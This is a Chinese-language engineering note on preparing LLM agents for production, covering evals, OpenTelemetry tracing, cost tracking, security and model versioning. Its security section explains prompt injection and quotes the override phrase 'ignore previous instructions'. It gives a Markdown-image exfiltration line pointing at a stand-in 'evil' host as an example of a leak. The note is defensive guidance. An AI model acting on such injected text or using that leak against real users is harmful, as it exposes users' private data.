# 04 · 上线前后：评测、可观测、安全

> 范围：agent 从「本地能跑」到「线上敢放」中间那一段。只讲通用原理和必须知道的坑，不讲某个框架的花哨功能。
> 资料核对时间：2026-10-09。MCP 协议本身（消息格式、传输、版本、协议层安全）放在 [05](05-mcp-design-choices.md)。

---

## 一、知识拆解

### 1. 评测（Evals）

**1.1 评测集从哪来**
- 评测集要从真实流量和真实失败里来，不要靠拍脑袋编题。做法：先把一批真实对话/轨迹拉出来，人一条条看，写下哪里错了，再把错误归类（Hamel 叫 error analysis），每一类挑代表样本进评测集。
- 坑：一上来就套用「有用性 1-5 分」「幻觉率」这类通用指标。这些分数和你产品的实际故障对不上，涨了跌了都说明不了问题。
- 没有线上数据时，可以按「功能 × 场景 × 用户类型」几个维度组合造合成输入，但造完要人看一遍，过滤掉不像真人会问的。

**1.2 单步评测 vs 端到端评测**
- 单步：只测一次模型调用，比如「给定这段上下文，有没有选对工具、参数对不对」。便宜、稳定、好定位。
- 端到端：跑完整个 agent 循环，看最终状态是否达成（订单真的改了吗、测试过了吗）。贴近用户，但慢、贵、噪声大。
- 工程上两者都要：端到端发现问题，单步把问题钉住并防回归。端到端尽量检查「环境最终状态」，不要只看模型最后说了什么——模型说「已完成」不代表完成了。

**1.3 评分方式的优先级**
- 能用代码判就用代码判：JSON 能不能解析、字段齐不齐、工具调用参数对不对、SQL 跑出来结果对不对、单测过没过。这类断言便宜且不会漂移。
- 判不了的再用 LLM 当评委，最后才是人工评分。人工评分用来校准评委，而不是长期主力。

**1.4 LLM 当评委的坑**
- 用二元判定（过/不过）加一段理由，别用 1-5 分。打分标准模糊时，评委和人都给不出稳定的分数。
- 评委本身要被评测：拿一批人工标好的样本，算评委和人的一致率（看真阳性率、真阴性率，不只是准确率，因为样本往往极不平衡）。
- 已知偏差：偏向排在前面/后面的答案（位置偏差）、偏向更长的答案、偏向自己同家族模型的输出。成对比较时要交换顺序各跑一次。
- 评委的 prompt 和模型版本也要固定、要做版本管理。评委一换，历史分数就不可比了。
- 「标准会随着看数据而变化」（criteria drift）：人在看输出的过程中才真正想清楚标准是什么，所以评委标准要迭代，而不是第一天写死。

**1.5 回归测试**
- 每次改 prompt、换模型、改工具描述、改上下文拼接逻辑，都要跑同一套评测集，对比前后结果。改 prompt 是改代码，要进 CI。
- 评测集分两类：能力评测（现在做不好、希望变好）和回归评测（现在做得好、不能变坏）。回归评测通过率应接近 100%，一掉就报警。
- 线上修过的每个 bug 都沉淀成一条回归用例。

**1.6 非确定性下怎么测**
- 同一用例跑多次（k 次）。pass@k = k 次里至少成功一次的概率；pass^k = k 次全成功的概率。面向用户的 agent 更该看 pass^k，因为用户每次都要成功。
- 比较两个版本时看差值是否大于噪声：样本少时 2-3 个百分点的变化通常只是噪声。至少报告样本数，最好报置信区间。
- 不要指望 temperature=0 就能消除随机性（见第 4 节）。

### 2. 可观测（Observability）

**2.1 trace / span 结构**
- 一次用户请求 = 一条 trace；里面每一步是一个 span：agent 调用（invoke_agent）→ 每轮模型调用（chat）→ 每次工具执行（execute_tool）→ 工具内部的 HTTP/DB 调用。span 之间是父子关系，靠 trace_id/span_id 串起来。
- 跨进程（agent 调 MCP 服务器、调下游服务）要传播 trace 上下文（W3C traceparent），否则 trace 会在边界断掉。MCP 2026-07-28 版已约定在 `_meta` 里放 `traceparent`/`tracestate`/`baggage`。
- 流式输出要记首 token 延迟（TTFT）和总时长，两者分开看；用户感知的卡顿主要看首 token。

**2.2 OpenTelemetry GenAI 语义约定**
- OTel 给大模型调用定了一套标准字段名，比如 `gen_ai.operation.name`、`gen_ai.provider.name`、`gen_ai.request.model`、`gen_ai.response.model`、`gen_ai.response.finish_reasons`、`gen_ai.usage.input_tokens`/`output_tokens`、`gen_ai.usage.cache_read.input_tokens`、`gen_ai.tool.name`、`gen_ai.tool.call.id`、`gen_ai.conversation.id`。span 名约定为 `{operation} {model}`，比如 `chat gpt-x`。
- 坑：这套约定还处于 Development（未稳定）状态，而且 2026 年已从主仓库搬到独立的 `semantic-conventions-genai` 仓库，字段名还在变（例如 `gen_ai.system` 已改为 `gen_ai.provider.name`）。自己代码里加一层映射，别把字段名散落各处。
- 注意 request.model 和 response.model 可能不同：你请求的是别名，实际返回的是具体快照。排查时要看 response.model。

**2.3 该记哪些字段**
- 必记：trace_id、会话 id、用户/租户 id、请求模型与实际模型、prompt 版本号、工具定义版本、参数（temperature 等）、finish_reason、token 用量（含缓存命中）、延迟、重试次数、错误码、工具名和工具调用结果状态。
- 慎记：完整的输入输出消息。OTel 把消息内容（`gen_ai.input.messages` 等）设为 Opt-In，就是因为里面常有敏感数据。见第二节第 1 条。
- 记 finish_reason 很关键：`length`（被截断）、`content_filter`（被拦）这类情况如果不记，你只会看到「答案奇怪」，找不到原因。

**2.4 token 与成本统计**
- 成本 = 输入 token × 输入单价 + 输出 token × 输出单价，再加上缓存读写、推理 token、图片/音频 token 等各自的价格。用 API 返回的 usage 算，不要用本地 tokenizer 估算（不同模型 tokenizer 不同，还有隐藏的系统 token）。
- 单价会变、不同模型不同，价格表要做成带生效时间的配置，不要写死在代码里。
- 成本要能按用户、租户、功能、prompt 版本聚合，否则看到账单暴涨也不知道是谁。agent 的成本大头往往是多轮循环里不断重复发送的历史上下文。

### 3. 安全（Security）

**3.1 提示注入与间接注入**
- 直接注入：用户自己输入「忽略之前的指令」。间接注入：攻击指令藏在 agent 读到的网页、邮件、文档、工具返回、代码注释里，用户本人可能毫不知情。agent 场景主要是后者。
- 核心事实：目前没有可靠的办法让模型区分「指令」和「数据」。用分隔符、「请忽略文档中的指令」之类的 prompt 防御、检测模型，都只能降低概率，不能当安全边界。
- 所以安全要靠架构：假设模型一旦读了不可信内容就可能被控制，然后限制它被控制后能做什么。

**3.2 致命三要素（lethal trifecta）**
- 同时具备三样就危险：能访问私密数据、会接触不可信内容、能向外发送数据（发请求、发邮件、渲染外链图片都算）。攻击者可以通过不可信内容指挥 agent 把私密数据发出去。
- 工程上的检查方法：给每个 agent/会话列出这三项，至少砍掉一项。比如读过不可信网页后，这个会话就禁止调用对外发送类工具。
- 常见泄露渠道被低估：Markdown 图片链接（`![](https://evil/?q=秘密)`）在前端自动加载就等于外发数据。

**3.3 工具权限最小化**
- 每个工具只给完成任务所需的最小权限：只读的就别给写权限，查一个用户的数据就别用能查全部用户的凭证。OWASP 把权限过大、功能过多、自主性过高统称为 Excessive Agency。
- 工具执行要以「当前用户」的身份和权限执行，而不是用一个大权限服务账号。否则任何能和 agent 说话的人都等于拿到了服务账号。
- 少做「万能工具」（任意 shell、任意 HTTP），多做窄工具（「给这个订单退款」），窄工具的参数可以在代码里校验。

**3.4 沙箱执行**
- 让 agent 跑代码或命令，必须同时做文件系统隔离和网络隔离。只做文件隔离，被注入后可以把能读到的东西发出去；只做网络隔离，可以改坏本地文件或埋后门。
- 沙箱里不要放长期凭证。需要访问外部服务时，在沙箱外由代理注入凭证并限定目标域名。
- 还要限资源：CPU、内存、执行时间、进程数、磁盘，防止死循环和资源耗尽。

**3.5 密钥处理**
- 密钥永远不进 prompt、不进上下文、不进日志、不进 trace。模型看到的东西都可能被它在回答里说出来，也可能被注入攻击引导出来。
- 工具调用时由执行层在模型看不到的地方附加凭证，模型只看到「调用了 X 工具」。
- 工具返回结果里也可能夹带 token、cookie、内部 URL，回传给模型前要过滤。

**3.6 输出校验**
- 把模型输出当作不可信的用户输入：要拼进 SQL 就参数化，要渲染到网页就转义，要当命令执行就白名单，要当 URL 访问就校验域名（防 SSRF）。OWASP 叫 Improper Output Handling。
- 结构化输出（JSON Schema / tool 参数）要在代码里再校验一次：类型、范围、枚举值、业务规则（比如退款金额不能超过订单金额）。模型「保证」的格式也会出错。
- 校验失败的处理要提前设计：把错误信息回给模型重试（限次数），还是直接失败返回。

**3.7 人工审批**
- 不可逆或对外可见的操作（转账、发邮件、删除、对外发布）要人确认。审批界面要展示真实要执行的参数，而不是模型写的摘要——摘要本身可能被注入篡改。
- 审批太多人会麻木点「同意」。所以要配合沙箱和权限收紧，把需要审批的动作降到少而关键。
- 审批记录（谁、什么时候、批准了什么参数）要落日志，便于事后追责。

### 4. 确定性与可复现

**4.1 temperature 和 seed 不保证确定**
- temperature=0 只是每步取概率最大的 token，但服务端的浮点计算会因为批大小（同时有多少别人的请求）不同而产生微小差异，在某个 token 上翻转之后整个后续都不同。这叫缺乏 batch invariance。
- seed 参数在部分厂商那里是「尽力而为」，并且后端配置变了（OpenAI 用 system_fingerprint 标识）结果也会变。很多新模型/推理模型干脆不支持 temperature 或 seed。
- 工程结论：别把测试建立在「输出逐字相同」上，断言要针对结构和语义；复现问题靠录制（见第二节第 2 条），而不是靠重新调用。

**4.2 模型版本固定**
- 用带日期/固定版本的模型 ID，不要用会自动指向最新版的别名。别名一变，你的行为在没发布任何代码的情况下就变了。
- 即使版本固定，厂商的推理基础设施也可能出问题导致质量下降（Anthropic 2025 年的事故复盘就是例子：路由错误、编译器 bug 让输出变差，且常规评测没测出来）。所以线上也要持续抽样评测，不只上线前测。
- 模型有下线日期，要追踪厂商的弃用公告，提前排期迁移和回归测试。

---

## 二、文章很少讲但常碰到的事

**1. 日志和 trace 里的敏感数据**
- agent 的 trace 天然包含用户原话、工具返回的数据库记录、文件内容，比普通服务日志敏感得多。默认不记完整内容，需要时按开关开启，并设置较短保存期。OTel 把消息内容设为 Opt-In，并有专门的敏感数据处理指南（在 Collector 里做删除/哈希/脱敏）。
- 脱敏要在发出进程前或在 Collector 里做，不要指望下游平台帮你删。可观测平台往往是第三方 SaaS，数据出去就收不回来。
- 坑：工程师为了调试会临时打开全量记录，然后忘了关。要有自动过期。

**2. 会话录制与重放来复现 bug**
- 因为模型输出不确定，「再跑一次」通常复现不了用户遇到的问题。要把每轮的完整请求（拼好的消息、工具定义、参数、模型版本）和响应原样录下来，复现时用录制的模型响应回放，只重新执行你的代码逻辑。
- 有了录制就能把线上失败直接变成回归用例（接第 1 节的回归测试），也能在新模型上重跑同样的上下文做对比。
- 录制数据就是敏感数据，适用第二节第 1 条的规则。

**3. 模型升级后的回归**
- 换模型（哪怕同家族小版本）会改变：工具调用习惯、输出长度、格式遵守程度、拒答倾向、对 prompt 措辞的敏感度。原来调好的 prompt 可能失效。
- 流程：新模型先跑全量离线评测 → 对比失败用例逐条看 → 小比例线上灰度并对比指标（成功率、成本、延迟、用户反馈）→ 再全量。旧模型 ID 保留一段时间作回滚。
- 成本也会变：新模型 tokenizer 不同，同样文本 token 数不同。

**4. prompt 也要版本化和灰度**
- prompt、工具描述、few-shot 示例、评委 prompt 都是会影响行为的「代码」，要有版本号、能回滚、改动要过评测。每条 trace 记录用的是哪个 prompt 版本，否则指标变化归因不了。
- 把 prompt 放到配置中心可以不发版就改，但这同时意味着可以不经评测就改坏线上。配置变更要走和代码一样的评审和灰度。

**5. 多租户隔离与按用户限额**
- 隔离：检索、记忆、缓存、向量库查询都要带租户过滤条件，且在代码里强制，不能靠模型「只查自己的」。prompt 缓存、结果缓存的 key 要包含租户，避免 A 看到 B 的内容。
- 限额：agent 一个请求可能循环几十轮、花几美元。要有按用户/租户的 token 预算、请求频率限制、单任务最大轮数、单任务最大花费，到了就停。OWASP 把这类问题叫 Unbounded Consumption（包括被人故意刷成本，所谓 denial of wallet）。
- 计费：用 API 返回的 usage 按租户累计，和厂商账单定期对账。

**6. 工具结果里的不可信内容**
- 工具返回的内容（网页、邮件、搜索结果、第三方 API、甚至自己数据库里用户写的字段）都可能带注入指令，地位等同于用户输入。拼回上下文时最好标明来源，但要清楚这只是降低风险。
- 返回内容要截断和清洗：太长会挤爆上下文或拉高成本；HTML/二进制要转换；错误信息里的栈和内部路径不要给模型。
- 「设计模式」思路：让读不可信内容的模型拿不到危险工具（双 LLM 模式、先定计划后执行、读不可信数据后降权）。

**7. 有副作用的工具重试会执行两次**
- 发邮件、下单这类工具被重试就是两份。退避、重试预算、幂等键的做法统一见 [02](02-reliability.md)；循环层面的总超时、最大轮数、错误回填见 [03](03-agent-loop-context.md) 第 6 节和决定 6。

**8. 线上信号闭环**
- 用户的显式反馈（点赞/踩）很稀疏，更有用的是隐式信号：用户重问、中途放弃、手动改写 agent 的结果、工具调用失败率、被截断率。把这些接进可观测，作为抽样人工复查的入口。

**9. 分数差几个点多半是噪声**
- 100 个用例、成功率 70% 时，95% 置信区间大约是正负 9 个百分点，"新模型 73% 对旧模型 70%"不足以支持切换。比较两个配置要做配对分析：同一批任务、同样的随机条件逐题比较谁赢，用 McNemar 检验或配对 bootstrap，每个配置跑 3–5 次看波动。出处：[李博杰《深入理解 AI Agent》第 7 章「评估结果的统计显著性」](https://github.com/bojieli/ai-agent-book/blob/main/book/chapter7.md)。
- 只关心"能不能偶尔成功"用 pass@k，上线关心的是 pass^k（连续 k 次都对）。单次成功率 60% 时，pass@5 约 99%，pass^5 只有约 8%。

**10. 只看最终状态会漏掉"做对了但说错了"**
- 环境状态对了、告诉用户的话却错了，这类失败在只检查最终状态的评测里看不见。书中引用 τ²-bench 公开基线：需要告知信息的 704 次运行失败 240 次，其中 80 次环境状态正确但告知错误，占全部失败的三分之一。评分要同时检查"做了什么"和"说了什么"。出处同上。

**11. 回归集不只要端到端用例，更要"轨迹前缀"用例**
- 把线上失败在第一个出错步骤之前的上下文、工具返回、环境状态冻结下来，只让 agent 走下一步，答案定义成"可接受动作集合"（比如先读仓库规则、先问用户、拒绝危险操作）再列出禁止动作。比端到端便宜，能把问题隔离到单个决策。失败归因要结构化记录首个错误的步骤号、工具名、证据，并区分根因和后果。出处同上。

**12. 改的东西不等于要优化的目标**
- 做 A/B 时，"把计划文件写短"是你直接改的机制指标，真正的目标可能是会话成本；还要设"不能变差"的护栏指标（用户满意度、错误率）。系统提示词要能确定性地渲染出来（同样配置永远同样文本），这样才能回答"哪次提交改了提示词、评测分数怎么变"。出处同上。

---

## 三、要拿的主意

每条按「要定什么 → 选项 → 代价 → 怎么选」写。

### 决定 1：评测：自建还是用平台
- 选项：(a) 自己写脚本，评测集放仓库里的 JSONL，在 CI 里跑；(b) 开源命令行框架，如 [promptfoo](https://github.com/promptfoo/promptfoo)、[openai/evals](https://github.com/openai/evals)；(c) 托管平台，如 [Braintrust](https://www.braintrust.dev/docs)、Langfuse。
- 代价：自建最灵活、数据不出公司，但看结果、做对比、给领域专家标注的界面都要自己做，而「让人方便地看数据」恰恰是评测最费时的部分（Hamel 反复强调要有自己的数据查看工具）。开源框架上手快，适合断言类评测和 CI，但多轮 agent 轨迹支持一般。平台有标注界面和实验对比，代价是数据出境、按量计费、绑定其数据格式。
- 怎么选：评测集和评分代码永远放在自己仓库里（可迁移的部分自己掌握）；早期用开源框架跑 CI 回归；当需要非工程师参与标注时再引入平台或自做一个简单的查看页面。用平台时确认能导出原始数据。

### 决定 2：trace：自建还是接第三方
- 选项：(a) 只写结构化日志；(b) 按 OTel GenAI 约定埋点，经 [OpenTelemetry Collector](https://github.com/open-telemetry/opentelemetry-collector) 发到自建后端（Jaeger/Tempo/ClickHouse 等）；(c) 用 LLM 专用平台的 SDK 直接上报（Langfuse、Braintrust 等）；(d) 埋点用 OTel，后端选支持 OTel 的 LLM 平台。
- 代价：纯日志最便宜，但多轮、多工具的父子关系很难看清。自建 OTel 后端数据可控，但通用 APM 界面不擅长展示长 prompt 和对话，看起来很累。专用平台展示好、自带成本统计和评测，但厂商 SDK 会锁定，数据出境（含用户原文）需要合规评估。
- 怎么选：埋点层一律用 OTel（或兼容 OTel 的 SDK），不要在业务代码里直接调平台私有 API，这样后端可以换。中间放一个 Collector，脱敏、采样、分流都在这里做。后端按数据合规要求选：内容敏感就自建或自托管开源平台。

### 决定 3：敏感内容记不记
- 选项：全量记录 / 只记元数据（token、延迟、工具名、状态）/ 按开关、按采样记录内容。
- 代价：全量记录排错最方便，但日志系统变成最大的数据泄露面，还要处理用户的删除请求；只记元数据安全，但出了「答案奇怪」的问题无从查起。
- 怎么选：默认只记元数据 + 内容哈希；对少量采样流量或用户主动反馈的会话记录全文，设短保存期；调试开关自动过期。

### 决定 4：防注入：靠检测还是靠架构
- 选项：(a) 输入/输出过滤模型或规则；(b) 架构限制（致命三要素至少砍一项、读不可信内容后降权、计划先于执行）；(c) 人工审批。
- 代价：检测便宜好加，但只降低概率，攻击者可以反复试到绕过；架构限制可靠，但会减少 agent 能做的事；审批多了用户会麻木。
- 怎么选：安全边界一定靠 (b)，(a) 作为额外一层和监控信号，(c) 只留给不可逆操作。

### 决定 5：模型：固定版本还是跟最新
- 选项：固定快照 ID / 用会自动更新的别名 / 固定 + 定期评估升级。
- 代价：固定最稳，但会碰到下线日期被迫一次性大迁移；别名省心，但行为会在你没发版时改变，回归没法归因。
- 怎么选：生产固定快照，评测流水线里同时跑「当前固定版本」和「最新版本」，有优势且回归通过再切。原型可以用别名。

### 决定 6：prompt 放代码里还是配置中心
- 选项：随代码发布 / 放配置中心或 prompt 管理平台，运行时拉取。
- 代价：随代码发布有评审、有评测、可回滚，但改一个词也要发版；配置中心改得快、可以灰度和 A/B，但容易绕过评测直接改坏线上，且 trace 里必须记版本号才能归因。
- 怎么选：两者都可以，关键是变更必须过同一套评测和灰度。团队里有非工程师频繁改 prompt 时才值得上配置中心。

---

## 四、资料清单

### 评测
- [Your AI Product Needs Evals – Hamel Husain](https://hamel.dev/blog/posts/evals/)：教学；1.1、1.3、1.5；从真实案例讲三层评测（单元断言、人工+模型评审、A/B），是建评测体系的入门首选。
- [Using LLM-as-a-Judge For Evaluation: A Complete Guide – Hamel Husain](https://hamel.dev/blog/posts/llm-judge/)：教学；1.4；讲二元判定加理由、找领域专家标注、用人工标注校准评委，步骤具体可照做。
- [AI Evals: Everything You Need to Know – Hamel Husain](https://hamel.dev/blog/posts/evals-faq/)：说明；第 1 节全部；问答形式覆盖评测集多大、合成数据怎么造、多轮和 agent 怎么评等高频疑问。
- [Evaluating the Effectiveness of LLM-Evaluators (aka LLM-as-Judge) – Eugene Yan](https://eugeneyan.com/writing/llm-evaluators/)：分析；1.4；系统梳理大量论文里评委的偏差、一致性和适用场景，适合理解「评委为什么不可靠」。
- [Demystifying evals for AI agents – Anthropic](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents)：教学；1.2、1.3、1.6；专讲 agent 评测，包括检查环境最终状态、pass@k 与 pass^k 的区别、评测从零起步的路线。
- [Evaluation best practices – OpenAI](https://developers.openai.com/api/docs/guides/evaluation-best-practices)：说明；1.1、1.5；官方给的评测设计流程和常见反模式，适合对照自查。
- [Who Validates the Validators? (Shankar et al.)](https://arxiv.org/abs/2404.12272)：分析（论文）；1.4；提出 criteria drift：评审标准只有在看过输出之后才能定下来，解释了为什么评委要迭代。
- [Judging LLM-as-a-Judge with MT-Bench and Chatbot Arena](https://arxiv.org/abs/2306.05685)：分析（论文）；1.4；首次系统量化位置偏差、长度偏差、自我偏好，评委偏差问题的原始出处。
- [深入理解 AI Agent：设计原理与工程实践 第 7 章（李博杰）](https://github.com/bojieli/ai-agent-book/blob/main/book/chapter7.md)：教学/分析；二-9 到二-12；「Agent 的评估」一章讲 pass^k、失败归因、端到端和轨迹前缀两层回归、统计显著性、生产里的消融和 A/B 方法，中文资料里少有的成体系写法。

### 可观测
- [OpenTelemetry GenAI 语义约定（独立仓库 docs/gen-ai）](https://github.com/open-telemetry/semantic-conventions-genai/tree/main/docs/gen-ai)：规范；2.2、2.3；GenAI 约定已从 opentelemetry.io 迁到这里，包含 spans、agent spans、metrics、events、MCP 各页，以此为准。
- [GenAI spans 规范（gen-ai-spans.md）](https://github.com/open-telemetry/semantic-conventions-genai/blob/main/docs/gen-ai/gen-ai-spans.md)：规范；2.1、2.2、2.3；逐个字段列出模型调用 span 该记什么、哪些是 Opt-In 敏感字段。
- [Handling sensitive data – OpenTelemetry](https://opentelemetry.io/docs/security/handling-sensitive-data/)：说明；二-1；讲在 SDK 和 Collector 层删除、哈希、脱敏敏感字段的具体手段。
- [Token & Cost Tracking – Langfuse](https://langfuse.com/docs/observability/features/token-and-cost-tracking)：说明；2.4；讲如何用 API 返回的 usage 计算成本、处理缓存和推理 token、维护模型价格表，概念通用于任何平台。

### 安全
- [OWASP Top 10 for LLM Applications (2025)](https://genai.owasp.org/llm-top-10/)：规范/清单；第 3 节全部；行业通用的风险清单，做安全评审时用来逐条对照。
- [LLM01:2025 Prompt Injection – OWASP](https://genai.owasp.org/llmrisk/llm01-prompt-injection/)：说明；3.1、二-6；区分直接与间接注入，列出攻击场景和缓解措施。
- [LLM06:2025 Excessive Agency – OWASP](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/)：说明；3.3、3.7；把「功能过多、权限过大、自主性过高」拆开讲，直接对应工具设计。
- [LLM10:2025 Unbounded Consumption – OWASP](https://genai.owasp.org/llmrisk/llm102025-unbounded-consumption/)：说明；二-5；讲资源和成本被耗尽（含 denial of wallet），是做限额和配额的依据。
- [Prompt injection 系列 – Simon Willison](https://simonwillison.net/series/prompt-injection/)：分析；3.1、3.2；从 2022 年追踪至今的系列文章，讲清楚为什么注入至今没有彻底解法。
- [The lethal trifecta for AI agents – Simon Willison](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)：分析；3.2、3.5；私密数据+不可信内容+外发能力三要素，最实用的 agent 安全检查框架。
- [Design Patterns for Securing LLM Agents against Prompt Injections – Simon Willison 解读](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/)：分析；3.1、二-6；解读论文提出的六种架构级防御模式（计划后执行、双 LLM 等），讲每种的代价。
- [Not what you've signed up for: Indirect Prompt Injection (Greshake et al.)](https://arxiv.org/abs/2302.12173)：分析（论文）；3.1、二-6；间接注入的原始论文，用真实应用演示攻击路径。
- [Making Claude Code more secure and autonomous with sandboxing – Anthropic](https://www.anthropic.com/engineering/claude-code-sandboxing)：说明；3.4、3.7；讲为什么文件隔离和网络隔离必须同时做，以及沙箱如何减少审批弹窗。

### 确定性与版本
- [Defeating Nondeterminism in LLM Inference – Thinking Machines](https://thinkingmachines.ai/blog/defeating-nondeterminism-in-llm-inference/)：分析；4.1；讲清 temperature=0 仍不确定的真正原因是批大小变化（缺乏 batch invariance），而不是常说的「GPU 并发」。
- [Model IDs and versioning – Claude Docs](https://platform.claude.com/docs/en/about-claude/models/model-ids-and-versions)：说明；4.2、二-3；别名和固定快照的区别与保证范围，是做模型版本固定的依据。
- [A postmortem of three recent issues – Anthropic](https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues)：分析；4.2、二-3、1.5；真实事故：模型版本没变但基础设施问题让质量下降，且离线评测没发现，说明线上持续评测的必要。

---

## 五、阅读顺序

1. 评测打底：Hamel《Your AI Product Needs Evals》→ Anthropic《Demystifying evals for AI agents》→ Hamel《LLM-as-a-Judge》→ Eugene Yan 评委综述。
2. 安全建立直觉：Simon《lethal trifecta》→ OWASP LLM01 / LLM06 / LLM10 → Simon《Design Patterns》解读 → Anthropic 沙箱文章。
3. 可观测落地：OTel gen-ai-spans.md（对着字段表设计自己的日志结构）→ OTel 敏感数据处理 → Langfuse 成本统计。
4. 收尾：Thinking Machines 非确定性 → Claude 模型版本说明 → Anthropic 事故复盘（把评测、版本、监控串起来）。

其余（OpenAI 评测最佳实践、两篇评委论文、Greshake 论文、Simon 系列、OWASP 总表）作为查阅资料。
